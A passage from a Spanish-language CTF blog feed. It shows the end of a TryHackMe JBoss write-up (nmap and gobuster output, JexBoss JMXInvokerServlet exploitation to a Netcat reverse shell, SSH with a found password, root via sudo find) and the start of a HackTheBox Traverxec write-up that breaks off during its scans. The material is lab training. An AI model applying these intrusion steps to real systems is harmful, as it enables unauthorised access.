&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     java.rmi.MarshalledObject&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     hash&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     locBytest
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     objBytesq
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;c1&#34;&gt;#http://thm-java-deserial.home:8083/q&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     org.jnp.server.NamingServer_Stub
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     java.rmi.server.RemoteStub
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     java.rmi.server.RemoteObject
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     xpwA
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     UnicastRef2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    thm-java-deserial.home
4446/tcp open  java-object Java Object Serialization
5500/tcp open  hotline?
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   DNSStatusRequestTCP: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     DIGEST-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     NTLM
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     GSSAPI
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     CRAM-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     thm-java-deserial
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   DNSVersionBindReqTCP: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     DIGEST-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     NTLM
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     CRAM-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     GSSAPI
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     thm-java-deserial
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   GenericLines, NULL: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     CRAM-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     DIGEST-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     GSSAPI
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     NTLM
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     thm-java-deserial
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   GetRequest: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     NTLM
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     GSSAPI
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     DIGEST-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     CRAM-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     thm-java-deserial
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   HTTPOptions, TLSSessionReq: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     DIGEST-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     CRAM-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     NTLM
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     GSSAPI
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     thm-java-deserial
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Help: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     NTLM
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     GSSAPI
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     CRAM-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     DIGEST-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     thm-java-deserial
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Kerberos: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     CRAM-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     DIGEST-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     NTLM
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     GSSAPI
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     thm-java-deserial
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   RPCCheck: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     DIGEST-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     CRAM-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     GSSAPI
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     NTLM
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     thm-java-deserial
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   RTSPRequest: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     CRAM-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     GSSAPI
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     DIGEST-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     NTLM
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     thm-java-deserial
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   SSLSessionReq: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     GSSAPI
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     CRAM-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     NTLM
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     DIGEST-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     thm-java-deserial
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   TerminalServerCookie: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     CRAM-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     GSSAPI
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     NTLM
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     DIGEST-MD5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    thm-java-deserial
8009/tcp open  ajp13       Apache Jserv &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Protocol v1.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ajp-methods: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Potentially risky methods: PUT DELETE TRACE
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-methods: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Potentially risky methods: PUT DELETE TRACE
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-open-proxy: Proxy might be redirecting requests
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache-Coyote/1.1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Welcome to JBoss AS
8083/tcp open  http        JBoss service httpd
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
&lt;span class=&#34;o&#34;&gt;==============&lt;/span&gt;NEXT SERVICE FINGERPRINT &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SUBMIT INDIVIDUALLY&lt;span class=&#34;o&#34;&gt;)==============&lt;/span&gt;
SF-Port1099-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.80%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4/17%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5E9A4F92%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;NU
... &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; snip &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ...
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Apr 17 19:54:24 2020 -- 1 IP address (1 host up) scanned in 73.17 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina corriendo en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tonythetiger/Screenshot%20from%202020-04-17%2017.41.20.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/tonythetiger# gobuster dir -u http://10.10.91.15 -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -x php,html,txt
/404.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/categories &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/fonts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/page &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/posts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/sitemap.xml &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/tags &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En la pagina encontramos una imagen, la descargamos y utilizamos &lt;code&gt;strings&lt;/code&gt; para buscar nuestra flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tonythetiger/Screenshot%20from%202020-04-17%2017.59.35.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tonythetiger/Screenshot%20from%202020-04-17%2017.59.52.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;http-8080&#34;&gt;HTTP 8080&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina corriendo en el puerto 8080.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tonythetiger/Screenshot%20from%202020-04-17%2017.48.42.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster-1&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/tonythetiger# gobuster dir -u http://10.10.91.15:8080 -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -x php,html,txt,jsp
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/favicon.ico &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/jbossws &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/jmx-console &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/manager &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/WEB-INF &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;jboss---jexboss-tool&#34;&gt;JBoss - JexBoss Tool&lt;/h2&gt;
&lt;p&gt;Como pudimos ver en la pagina en el puerto 8080 esta corriendo JBoss, y vemos la version en &lt;code&gt;/jbossws/&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tonythetiger/Screenshot%20from%202020-04-17%2018.14.04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;a href=&#34;https://github.com/joaomatosf/jexboss&#34;&gt;&lt;strong&gt;Jexboss&lt;/strong&gt;&lt;/a&gt; para verificar si la maquina es vulnerable y automatizar un ataque. Nos muestra que tiene varias vulnerabilidades.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tonythetiger/Screenshot%20from%202020-04-17%2018.27.28.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Mientras nuestra herramienta verifica las vulnerabilidades, tambien nos da la opcion de explotar la maquina, en este caso utilizamos &lt;strong&gt;JMXInvokerServlet&lt;/strong&gt; para obtener una shell inversa, ingresando nuestra IP y el puerto que tenemos a la escucha con Netcat.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tonythetiger/Screenshot%20from%202020-04-17%2018.31.57.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Netcat&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tonythetiger/Screenshot%20from%202020-04-17%2018.32.27.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---cmnatic&#34;&gt;USER - CMNATIC&lt;/h2&gt;
&lt;p&gt;Logramos obtener una shell inversa con el usuario cmnatic y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt; en la carpeta principal de jboss.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tonythetiger/Screenshot%20from%202020-04-17%2018.39.52.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---jboss&#34;&gt;USER - JBOSS&lt;/h2&gt;
&lt;p&gt;En la carpeta de este usuario encontramos una nota en la que contiene una contraseña, al utilizarla en el servicio de SSH logramos obtener una shell.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tonythetiger/Screenshot%20from%202020-04-17%2018.41.48.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SSH&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tonythetiger/Screenshot%20from%202020-04-17%2018.42.09.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos root (sudo) para ejecutar el comando &lt;code&gt;find&lt;/code&gt;. Utilizamos find para obtener una shell root.&lt;br /&gt;
![image](/images/posts/thm/tonythetiger/Screenshot from 2020-04-17 18.43.56.webp)&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://gtfobins.github.io/gtfobins/find/&#34;&gt;&lt;strong&gt;Find&lt;/strong&gt;&lt;/a&gt;&lt;br /&gt;
Logramos obtener una shell root, econtramos nuestra ultima flag &lt;strong&gt;root.txt&lt;/strong&gt; pero al parecer esta codificada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tonythetiger/Screenshot%20from%202020-04-17%2018.45.51.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al decodificar nuestra flag nos devuelve un hash, utilizamos crackstation para obtener el texto.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tonythetiger/Screenshot%20from%202020-04-17%2018.50.15.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Crackstation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tonythetiger/Screenshot%20from%202020-04-17%2018.50.36.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/tonythetiger/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/tonythetiger/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Traverxec</title>
        <link>https://sckull.github.io/posts/traverxec/</link>
        <pubDate>Sat, 11 Apr 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 11 Apr 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/traverxec/</guid>
        <description>Traverxec es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Traverxec es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/traverxec/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Traverxec&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.165&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/77141&#34;&gt;jkr&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp, nmap y masscan nos muestran el puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/traverxec# masscan -p1-65535,U:1-65535 10.10.10.165 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-12-30 05:12:44 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 22/tcp on 10.10.10.165                                    
Discovered open port 80/tcp on 10.10.10.165

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sun Dec 29 23:09:53 2019 as: nmap -p- --min-rate 1000 -o nmap_scan 10.10.10.165&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.165
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.28s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65533&lt;/span&gt; filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sun Dec 29 23:12:05 2019 -- 1 IP address (1 host up) scanned in 132.10 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sun Dec 29 23:12:40 2019 as: nmap -sV -sC -p22,80 -o nmap_scan_pr 10.10.10.165&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.165
